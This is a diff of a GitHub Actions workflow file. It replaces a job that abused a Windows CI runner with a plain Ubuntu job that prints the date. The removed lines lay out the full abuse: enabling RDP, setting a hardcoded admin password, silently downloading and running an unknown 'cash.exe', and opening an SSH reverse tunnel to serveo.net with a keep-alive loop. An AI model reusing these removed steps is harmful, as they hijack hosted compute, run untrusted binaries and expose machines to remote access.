@@ -1,41 +1,12 @@
-name: Chrome Remote Desktop with Serveo
+name: Scheduled Test
 
 on:
-  push:
-  workflow_dispatch:
-    inputs:
-      code:
-        description: 'Enter the --code value for Chrome Remote Desktop'
-        required: true
-        type: string
   schedule:
-    - cron: '40 19 * * *' # This will run the workflow at 7:30 PM UTC every day
+    - cron: '43 19 * * *'  # Runs at 7:30 PM UTC every day
 
 jobs:
-  build:
-    runs-on: windows-latest
-    timeout-minutes: 360
-    
+  test-job:
+    runs-on: ubuntu-latest
     steps:
-      - name: Enable Terminal Services and Firewall Rules
-        run: |
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
-          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
-      - name: Set Password for runneradmin
-        run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
-      - name: Rename Computer to nono1321
-        run: Rename-Computer -NewName "nono1321"
-      - name: Download and run Cashvib File
-        run: |
-          Invoke-WebRequest -Uri "https://github.com/jackricj/std1/raw/main/cash.exe" -OutFile "Cash.exe"
-          Start-Process -FilePath "D:\a\win23\win23\Cash.exe" -ArgumentList "/S"
-      - name: Establish RDP Tunnel
-        run: |
-          echo 'yes' | ssh -o StrictHostKeyChecking=accept-new -R 33389:localhost:3389 serveo.net
-          Start-Sleep -Seconds 120
-          
-          while ($true) {
-             echo "Keep-Alive"
-             Start-Sleep -Seconds 60
-          }
+      - name: Print Current Date and Time
+        run: date -u
